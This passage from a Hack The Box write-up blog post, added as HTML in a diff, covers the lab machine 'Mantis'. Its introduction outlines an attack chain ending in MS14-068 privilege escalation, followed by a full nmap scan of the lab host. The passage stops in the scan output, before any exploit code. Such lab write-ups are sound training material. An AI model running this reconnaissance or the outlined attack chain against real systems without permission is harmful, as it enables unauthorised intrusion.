@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HTB - Mantis — 0xma1ware</title>
+  <meta name="description" content="Mantis was an interesting box with a somewhat realistic chain of attack, it started off with two webservers both IIS one had Orchard CMS the other had a secret directory which contained some credentia">
+  <meta name="author" content="ma1ware">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://0xma1ware.github.io/posts/mantis.html">
+  <meta property="og:title" content="HTB - Mantis">
+  <meta property="og:description" content="Mantis was an interesting box with a somewhat realistic chain of attack, it started off with two webservers both IIS one had Orchard CMS the other had a secret directory which contained some credentia">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://0xma1ware.github.io/posts/mantis.html">
+  <meta property="og:image" content="https://0xma1ware.github.io/favicon.ico">
+  <meta property="article:published_time" content="2023-07-29">
+  <meta property="article:author" content="ma1ware">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@0xma1ware">
+  <meta name="twitter:title" content="HTB - Mantis">
+  <meta name="twitter:description" content="Mantis was an interesting box with a somewhat realistic chain of attack, it started off with two webservers both IIS one had Orchard CMS the other had a secret directory which contained some credentia">
+  <link rel="icon" href="../favicon.ico">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Fira+Code:wght@400;500;600&family=Orbitron:wght@600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org", "@type": "BlogPosting",
+    "headline": "HTB - Mantis", "description": "Mantis was an interesting box with a somewhat realistic chain of attack, it started off with two webservers both IIS one had Orchard CMS the other had a secret directory which contained some credentia",
+    "datePublished": "2023-07-29",
+    "author": { "@type": "Person", "name": "ma1ware", "url": "https://github.com/0xma1ware" },
+    "publisher": { "@type": "Person", "name": "ma1ware" },
+    "mainEntityOfPage": { "@type": "WebPage", "@id": "https://0xma1ware.github.io/posts/mantis.html" }
+  }
+  </script>
+</head>
+<body>
+  <header class="site-header">
+    <a href="../" class="site-logo"><img src="../favicon.ico" alt="logo"><span class="prefix">0x</span>ma1ware<span class="cursor-blink"></span></a>
+    <button class="menu-toggle" aria-label="Menu" onclick="document.querySelector('.site-nav').classList.toggle('open')">
+      <span></span><span></span><span></span>
+    </button>
+    <nav><ul class="site-nav">
+      <li><a href="../">home</a></li>
+      <li><a href="https://github.com/0xma1ware" target="_blank" rel="noopener">github</a></li>
+      <li><a href="https://x.com/0xma1ware" target="_blank" rel="noopener">x.com</a></li>
+    </ul></nav>
+  </header>
+
+  <div class="post-header animate-in">
+    <a href="../" class="back-link">&larr; back to all posts</a>
+    <h1>HTB - Mantis</h1>
+    <div class="post-meta">
+      <span>2023-07-29</span>
+      <span class="category ">htb</span>
+      <span class="diff hard">hard</span>
+      <span>by ma1ware</span>
+    </div>
+    <div class="tags" style="margin-top:.75rem;"><span class="tag">windows</span><span class="tag">webserver</span><span class="tag">orchard cms</span><span class="tag">mssql</span><span class="tag">hard</span></div>
+  </div>
+
+  <article class="post-content animate-in">
+    <div class="toc"><div class="toc-title">// Table of Contents</div><ul><li class="toc-h1"><a href="#introdution">Introdution</a></li><li class="toc-h1"><a href="#nmap">Nmap</a></li><li class="toc-h2"><a href="#information-recon">Information Recon</a></li><li class="toc-h1"><a href="#enumeration">Enumeration</a></li><li class="toc-h2"><a href="#port-8080-http-iis">Port 8080 - HTTP (IIS)</a></li><li class="toc-h2"><a href="#port-389-ldap">Port 389 - LDAP</a></li><li class="toc-h2"><a href="#port-88-kerberos">Port 88 - Kerberos</a></li><li class="toc-h2"><a href="#port-1337-http">Port 1337 - HTTP</a></li><li class="toc-h2"><a href="#port-1433-mssql">Port 1433 - MSSQL</a></li><li class="toc-h1"><a href="#bloodhound">Bloodhound?</a></li><li class="toc-h2"><a href="#the-breakthrough">The Breakthrough</a></li><li class="toc-h2"><a href="#metasploit-framework">Metasploit Framework</a></li><li class="toc-h2"><a href="#non-metasploit-method">Non-metasploit method</a></li></ul></div>
+    <h1 id="introdution">Introdution</h1>
+<p>Mantis was an interesting box with a somewhat realistic chain of attack, it started off with two webservers both IIS one had Orchard CMS the other had a secret directory which contained some credentials which you could use to access MSSQL db which you then used to find the plaintext credentials for a user james.<br />
+The box was pretty old and vulnerable to MS14-068 which we exploited to get a root-shel.</p>
+<h1 id="nmap">Nmap</h1>
+<hr />
+<h2 id="information-recon">Information Recon</h2>
+<p>Ports tcp open in nmap format</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>PORT<span style="color: #F8F8F2">      </span>STATE<span style="color: #F8F8F2"> </span>SERVICE<span style="color: #F8F8F2">      </span>REASON
+<span style="color: #AE81FF">53</span>/tcp<span style="color: #F8F8F2">    </span>open<span style="color: #F8F8F2">  </span>domain<span style="color: #F8F8F2">       </span>syn-ack
+<span style="color: #AE81FF">88</span>/tcp<span style="color: #F8F8F2">    </span>open<span style="color: #F8F8F2">  </span>kerberos-sec<span style="color: #F8F8F2"> </span>syn-ack
+<span style="color: #AE81FF">135</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">        </span>syn-ack
+<span style="color: #AE81FF">139</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>netbios-ssn<span style="color: #F8F8F2">  </span>syn-ack
+<span style="color: #AE81FF">389</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>ldap<span style="color: #F8F8F2">         </span>syn-ack
+<span style="color: #AE81FF">445</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>microsoft-ds<span style="color: #F8F8F2"> </span>syn-ack
+<span style="color: #AE81FF">1433</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>ms-sql-s<span style="color: #F8F8F2">     </span>syn-ack
+<span style="color: #AE81FF">8080</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>http-proxy<span style="color: #F8F8F2">   </span>syn-ack
+<span style="color: #AE81FF">49152</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>unknown<span style="color: #F8F8F2">      </span>syn-ack
+<span style="color: #AE81FF">49153</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>unknown<span style="color: #F8F8F2">      </span>syn-ack
+<span style="color: #AE81FF">49155</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>unknown<span style="color: #F8F8F2">      </span>syn-ack
+<span style="color: #AE81FF">49157</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>unknown<span style="color: #F8F8F2">      </span>syn-ack
+</code></pre></div>
+
+<p>Ports services and versions nmap format</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #959077"># Nmap 7.93 scan initiated Wed Jul 26 15:48:15 2023 as: nmap -p 50255,139,3269,88,8080,464,49153,389,3268,135,49158,49186,49154,49152,47001,49155,636,49166,53,593,445,1337,49157,5722,49170,9389,1433 -sC -sV -oA scans/Mantis 10.129.140.187</span>
+Nmap<span style="color: #F8F8F2"> </span>scan<span style="color: #F8F8F2"> </span>report<span style="color: #F8F8F2"> </span><span style="color: #66D9EF">for</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">10</span>.129.140.187
+Host<span style="color: #F8F8F2"> </span>is<span style="color: #F8F8F2"> </span>up<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span><span style="color: #AE81FF">0</span>.21s<span style="color: #F8F8F2"> </span>latency<span style="color: #FF4689">)</span>.
+
+PORT<span style="color: #F8F8F2">      </span>STATE<span style="color: #F8F8F2"> </span>SERVICE<span style="color: #F8F8F2">      </span>VERSION
+<span style="color: #AE81FF">53</span>/tcp<span style="color: #F8F8F2">    </span>open<span style="color: #F8F8F2">  </span>domain<span style="color: #F8F8F2">       </span>Microsoft<span style="color: #F8F8F2"> </span>DNS<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">6</span>.1.7601<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>1DB15CD4<span style="color: #FF4689">)</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>Windows<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2008</span><span style="color: #F8F8F2"> </span>R2<span style="color: #F8F8F2"> </span>SP1<span style="color: #FF4689">)</span>
+<span style="color: #F8F8F2">| </span>dns-nsid:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">  </span>bind.version:<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>DNS<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">6</span>.1.7601<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>1DB15CD4<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">88</span>/tcp<span style="color: #F8F8F2">    </span>open<span style="color: #F8F8F2">  </span>kerberos-sec<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>Kerberos<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>server<span style="color: #F8F8F2"> </span>time:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-26<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">12</span>:48:25Z<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">135</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">        </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">139</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>netbios-ssn<span style="color: #F8F8F2">  </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>netbios-ssn
+<span style="color: #AE81FF">389</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>ldap<span style="color: #F8F8F2">         </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>Active<span style="color: #F8F8F2"> </span>Directory<span style="color: #F8F8F2"> </span>LDAP<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>Domain:<span style="color: #F8F8F2"> </span>htb.local,<span style="color: #F8F8F2"> </span>Site:<span style="color: #F8F8F2"> </span>Default-First-Site-Name<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">445</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>microsoft-ds<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2008</span><span style="color: #F8F8F2"> </span>R2<span style="color: #F8F8F2"> </span>Standard<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">7601</span><span style="color: #F8F8F2"> </span>Service<span style="color: #F8F8F2"> </span>Pack<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2"> </span>microsoft-ds<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>workgroup:<span style="color: #F8F8F2"> </span>HTB<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">464</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>tcpwrapped
+<span style="color: #AE81FF">593</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>ncacn_http<span style="color: #F8F8F2">   </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC<span style="color: #F8F8F2"> </span>over<span style="color: #F8F8F2"> </span>HTTP<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span>.0
+<span style="color: #AE81FF">636</span>/tcp<span style="color: #F8F8F2">   </span>open<span style="color: #F8F8F2">  </span>tcpwrapped
+<span style="color: #AE81FF">1337</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>http<span style="color: #F8F8F2">         </span>Microsoft<span style="color: #F8F8F2"> </span>IIS<span style="color: #F8F8F2"> </span>httpd<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">7</span>.5
+<span style="color: #F8F8F2">|</span>_http-server-header:<span style="color: #F8F8F2"> </span>Microsoft-IIS/7.5
+<span style="color: #F8F8F2">| </span>http-methods:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">  </span>Potentially<span style="color: #F8F8F2"> </span>risky<span style="color: #F8F8F2"> </span>methods:<span style="color: #F8F8F2"> </span>TRACE
+<span style="color: #F8F8F2">|</span>_http-title:<span style="color: #F8F8F2"> </span>IIS7
+<span style="color: #AE81FF">1433</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>ms-sql-s<span style="color: #F8F8F2">     </span>Microsoft<span style="color: #F8F8F2"> </span>SQL<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2014</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">12</span>.00.2000.00<span style="color: #F8F8F2">; </span>RTM
+<span style="color: #F8F8F2">| </span>ms-sql-ntlm-info:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|   </span><span style="color: #AE81FF">10</span>.129.140.187:1433:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|     </span>Target_Name:<span style="color: #F8F8F2"> </span>HTB
+<span style="color: #F8F8F2">|     </span>NetBIOS_Domain_Name:<span style="color: #F8F8F2"> </span>HTB
+<span style="color: #F8F8F2">|     </span>NetBIOS_Computer_Name:<span style="color: #F8F8F2"> </span>MANTIS
+<span style="color: #F8F8F2">|     </span>DNS_Domain_Name:<span style="color: #F8F8F2"> </span>htb.local
+<span style="color: #F8F8F2">|     </span>DNS_Computer_Name:<span style="color: #F8F8F2"> </span>mantis.htb.local
+<span style="color: #F8F8F2">|     </span>DNS_Tree_Name:<span style="color: #F8F8F2"> </span>htb.local
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">    </span>Product_Version:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">6</span>.1.7601
+<span style="color: #F8F8F2">|</span>_ssl-date:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-26T12:49:44+00:00<span style="color: #F8F8F2">; </span>-7h00m00s<span style="color: #F8F8F2"> </span>from<span style="color: #F8F8F2"> </span>scanner<span style="color: #F8F8F2"> </span>time.
+<span style="color: #F8F8F2">| </span>ms-sql-info:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|   </span><span style="color: #AE81FF">10</span>.129.140.187:1433:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|     </span>Version:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|       </span>name:<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>SQL<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2014</span><span style="color: #F8F8F2"> </span>RTM
+<span style="color: #F8F8F2">|       </span>number:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">12</span>.00.2000.00
+<span style="color: #F8F8F2">|       </span>Product:<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>SQL<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2014</span>
+<span style="color: #F8F8F2">|       </span>Service<span style="color: #F8F8F2"> </span>pack<span style="color: #F8F8F2"> </span>level:<span style="color: #F8F8F2"> </span>RTM
+<span style="color: #F8F8F2">|       </span>Post-SP<span style="color: #F8F8F2"> </span>patches<span style="color: #F8F8F2"> </span>applied:<span style="color: #F8F8F2"> false</span>
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">    </span>TCP<span style="color: #F8F8F2"> </span>port:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1433</span>
+<span style="color: #F8F8F2">| </span>ssl-cert:<span style="color: #F8F8F2"> </span>Subject:<span style="color: #F8F8F2"> commonName</span><span style="color: #FF4689">=</span>SSL_Self_Signed_Fallback
+<span style="color: #F8F8F2">| </span>Not<span style="color: #F8F8F2"> </span>valid<span style="color: #F8F8F2"> </span>before:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-26T12:29:09
+<span style="color: #F8F8F2">|</span>_Not<span style="color: #F8F8F2"> </span>valid<span style="color: #F8F8F2"> </span>after:<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">2053</span>-07-26T12:29:09
+<span style="color: #AE81FF">3268</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>ldap<span style="color: #F8F8F2">         </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>Active<span style="color: #F8F8F2"> </span>Directory<span style="color: #F8F8F2"> </span>LDAP<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>Domain:<span style="color: #F8F8F2"> </span>htb.local,<span style="color: #F8F8F2"> </span>Site:<span style="color: #F8F8F2"> </span>Default-First-Site-Name<span style="color: #FF4689">)</span>
+<span style="color: #AE81FF">3269</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>tcpwrapped
+<span style="color: #AE81FF">5722</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">        </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">8080</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>http<span style="color: #F8F8F2">         </span>Microsoft<span style="color: #F8F8F2"> </span>IIS<span style="color: #F8F8F2"> </span>httpd<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">7</span>.5
+<span style="color: #F8F8F2">|</span>_http-open-proxy:<span style="color: #F8F8F2"> </span>Proxy<span style="color: #F8F8F2"> </span>might<span style="color: #F8F8F2"> </span>be<span style="color: #F8F8F2"> </span>redirecting<span style="color: #F8F8F2"> </span>requests
+<span style="color: #F8F8F2">|</span>_http-server-header:<span style="color: #F8F8F2"> </span>Microsoft-IIS/7.5
+<span style="color: #F8F8F2">|</span>_http-title:<span style="color: #F8F8F2"> </span>Tossed<span style="color: #F8F8F2"> </span>Salad<span style="color: #F8F8F2"> </span>-<span style="color: #F8F8F2"> </span>Blog
+<span style="color: #AE81FF">9389</span>/tcp<span style="color: #F8F8F2">  </span>open<span style="color: #F8F8F2">  </span>mc-nmf<span style="color: #F8F8F2">       </span>.NET<span style="color: #F8F8F2"> </span>Message<span style="color: #F8F8F2"> </span>Framing
+<span style="color: #AE81FF">47001</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>http<span style="color: #F8F8F2">         </span>Microsoft<span style="color: #F8F8F2"> </span>HTTPAPI<span style="color: #F8F8F2"> </span>httpd<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2</span>.0<span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>SSDP/UPnP<span style="color: #FF4689">)</span>
+<span style="color: #F8F8F2">|</span>_http-title:<span style="color: #F8F8F2"> </span>Not<span style="color: #F8F8F2"> </span>Found
+<span style="color: #F8F8F2">|</span>_http-server-header:<span style="color: #F8F8F2"> </span>Microsoft-HTTPAPI/2.0
+<span style="color: #AE81FF">49152</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">        </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">49153</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">        </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">49154</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">        </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">49155</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">        </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">49157</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>ncacn_http<span style="color: #F8F8F2">   </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC<span style="color: #F8F8F2"> </span>over<span style="color: #F8F8F2"> </span>HTTP<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span>.0
+<span style="color: #AE81FF">49158</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">        </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">49166</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">        </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">49170</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">        </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">49186</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>msrpc<span style="color: #F8F8F2">        </span>Microsoft<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>RPC
+<span style="color: #AE81FF">50255</span>/tcp<span style="color: #F8F8F2"> </span>open<span style="color: #F8F8F2">  </span>ms-sql-s<span style="color: #F8F8F2">     </span>Microsoft<span style="color: #F8F8F2"> </span>SQL<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2014</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">12</span>.00.2000.00<span style="color: #F8F8F2">; </span>RTM
+<span style="color: #F8F8F2">| </span>ms-sql-ntlm-info:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|   </span><span style="color: #AE81FF">10</span>.129.140.187:50255:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|     </span>Target_Name:<span style="color: #F8F8F2"> </span>HTB
+<span style="color: #F8F8F2">|     </span>NetBIOS_Domain_Name:<span style="color: #F8F8F2"> </span>HTB
+<span style="color: #F8F8F2">|     </span>NetBIOS_Computer_Name:<span style="color: #F8F8F2"> </span>MANTIS
+<span style="color: #F8F8F2">|     </span>DNS_Domain_Name:<span style="color: #F8F8F2"> </span>htb.local
+<span style="color: #F8F8F2">|     </span>DNS_Computer_Name:<span style="color: #F8F8F2"> </span>mantis.htb.local
+<span style="color: #F8F8F2">|     </span>DNS_Tree_Name:<span style="color: #F8F8F2"> </span>htb.local
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">    </span>Product_Version:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">6</span>.1.7601
+<span style="color: #F8F8F2">| </span>ms-sql-info:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|   </span><span style="color: #AE81FF">10</span>.129.140.187:50255:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|     </span>Version:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|       </span>name:<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>SQL<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2014</span><span style="color: #F8F8F2"> </span>RTM
+<span style="color: #F8F8F2">|       </span>number:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">12</span>.00.2000.00
+<span style="color: #F8F8F2">|       </span>Product:<span style="color: #F8F8F2"> </span>Microsoft<span style="color: #F8F8F2"> </span>SQL<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2014</span>
+<span style="color: #F8F8F2">|       </span>Service<span style="color: #F8F8F2"> </span>pack<span style="color: #F8F8F2"> </span>level:<span style="color: #F8F8F2"> </span>RTM
+<span style="color: #F8F8F2">|       </span>Post-SP<span style="color: #F8F8F2"> </span>patches<span style="color: #F8F8F2"> </span>applied:<span style="color: #F8F8F2"> false</span>
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">    </span>TCP<span style="color: #F8F8F2"> </span>port:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">50255</span>
+<span style="color: #F8F8F2">| </span>ssl-cert:<span style="color: #F8F8F2"> </span>Subject:<span style="color: #F8F8F2"> commonName</span><span style="color: #FF4689">=</span>SSL_Self_Signed_Fallback
+<span style="color: #F8F8F2">| </span>Not<span style="color: #F8F8F2"> </span>valid<span style="color: #F8F8F2"> </span>before:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-26T12:29:09
+<span style="color: #F8F8F2">|</span>_Not<span style="color: #F8F8F2"> </span>valid<span style="color: #F8F8F2"> </span>after:<span style="color: #F8F8F2">  </span><span style="color: #AE81FF">2053</span>-07-26T12:29:09
+<span style="color: #F8F8F2">|</span>_ssl-date:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-26T12:49:44+00:00<span style="color: #F8F8F2">; </span>-7h00m00s<span style="color: #F8F8F2"> </span>from<span style="color: #F8F8F2"> </span>scanner<span style="color: #F8F8F2"> </span>time.
+Service<span style="color: #F8F8F2"> </span>Info:<span style="color: #F8F8F2"> </span>Host:<span style="color: #F8F8F2"> </span>MANTIS<span style="color: #F8F8F2">; </span>OS:<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2">; </span>CPE:<span style="color: #F8F8F2"> </span>cpe:/o:microsoft:windows_server_2008:r2:sp1,<span style="color: #F8F8F2"> </span>cpe:/o:microsoft:windows
+
+Host<span style="color: #F8F8F2"> </span>script<span style="color: #F8F8F2"> </span>results:
+<span style="color: #F8F8F2">| </span>smb2-security-mode:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|   </span><span style="color: #AE81FF">210</span>:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">    </span>Message<span style="color: #F8F8F2"> </span>signing<span style="color: #F8F8F2"> </span>enabled<span style="color: #F8F8F2"> </span>and<span style="color: #F8F8F2"> </span>required
+<span style="color: #F8F8F2">| </span>smb-os-discovery:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|   </span>OS:<span style="color: #F8F8F2"> </span>Windows<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2008</span><span style="color: #F8F8F2"> </span>R2<span style="color: #F8F8F2"> </span>Standard<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">7601</span><span style="color: #F8F8F2"> </span>Service<span style="color: #F8F8F2"> </span>Pack<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2"> </span><span style="color: #FF4689">(</span>Windows<span style="color: #F8F8F2"> </span>Server<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2008</span><span style="color: #F8F8F2"> </span>R2<span style="color: #F8F8F2"> </span>Standard<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">6</span>.1<span style="color: #FF4689">)</span>
+<span style="color: #F8F8F2">|   </span>OS<span style="color: #F8F8F2"> </span>CPE:<span style="color: #F8F8F2"> </span>cpe:/o:microsoft:windows_server_2008::sp1
+<span style="color: #F8F8F2">|   </span>Computer<span style="color: #F8F8F2"> </span>name:<span style="color: #F8F8F2"> </span>mantis
+<span style="color: #F8F8F2">|   </span>NetBIOS<span style="color: #F8F8F2"> </span>computer<span style="color: #F8F8F2"> </span>name:<span style="color: #F8F8F2"> </span>MANTIS<span style="color: #AE81FF">\x00</span>
+<span style="color: #F8F8F2">|   </span>Domain<span style="color: #F8F8F2"> </span>name:<span style="color: #F8F8F2"> </span>htb.local
+<span style="color: #F8F8F2">|   </span>Forest<span style="color: #F8F8F2"> </span>name:<span style="color: #F8F8F2"> </span>htb.local
+<span style="color: #F8F8F2">|   </span>FQDN:<span style="color: #F8F8F2"> </span>mantis.htb.local
+<span style="color: #F8F8F2">|</span>_<span style="color: #F8F8F2">  </span>System<span style="color: #F8F8F2"> </span>time:<span style="color: #F8F8F2"> </span><span style="color: #AE81FF">2023</span>-07-26T08:49:29-04:00
+<span style="color: #F8F8F2">| </span>smb-security-mode:<span style="color: #F8F8F2"> </span>
+<span style="color: #F8F8F2">|   </span>account_used:<span style="color: #F8F8F2"> </span>&lt;blank&gt;
+<span style="color: #F8F8F2">|   </span>authentication_level:<span style="color: #F8F8F2"> </span>user
+<span style="color: #F8F8F2">|   </span>challenge_response:<span style="color: #F8F8F2"> </span>supported
